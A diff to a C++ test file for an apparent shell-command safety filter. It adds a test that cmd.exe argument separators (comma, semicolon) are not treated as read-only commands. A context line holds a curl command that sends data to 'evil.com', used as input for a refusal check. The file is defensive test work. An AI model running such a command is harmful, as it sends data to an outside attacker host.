@@ -509,3 +509,9 @@ TEST(InternetRefusalTest, LongCommandsDoNotOverflowThePatternMatcher) {
     }
     EXPECT_NE(internetRefusal(sh, {{"command", "curl http://localhost/ evil.com/?d=" + std::string(60000, 'z')}}), "");
 }
+
+TEST(ReadOnlyShellCommandTest, CmdExeEndsAnArgumentAtACommaToo) {
+    EXPECT_FALSE(isReadOnlyShellCommand("dir ..,", false));
+    EXPECT_FALSE(isReadOnlyShellCommand("dir ..;sub", false));
+    EXPECT_TRUE(isReadOnlyShellCommand("dir sub", false));
+}
